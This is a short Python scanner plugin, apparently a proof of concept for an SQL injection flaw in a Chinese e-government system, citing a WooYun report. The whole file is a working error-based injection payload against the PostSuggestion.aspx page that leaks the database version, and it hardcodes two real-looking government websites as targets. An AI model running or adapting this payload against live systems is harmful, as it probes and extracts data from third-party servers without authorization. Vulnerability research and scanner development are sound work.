#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:北斗星电子政务系统SQL注入漏洞
#Refer:http://www.wooyun.org/bugs/wooyun-2010-076736

def assign(service,arg):
    if service=="7stars":
        return True,arg 
    


def  audit(arg):
    url=arg+"sssweb/SuggestionCollection/PostSuggestion.aspx?ID=1%27+and+1=char(73)%2Bchar(73)%2Bchar(73)%2B@@version+and+%27a%27=%27a"
    code,head,res,errcode,_=curl.curl2(url)   
    if code==500 and 'IIIMicrosoft' in res:
        security_hole(url)

if __name__=="__main__":
    from dummy import *

    audit(assign('7stars','http://www.hysczj.gov.cn/')[1])
    audit(assign('7stars','http://zx.cq.gov.cn/')[1])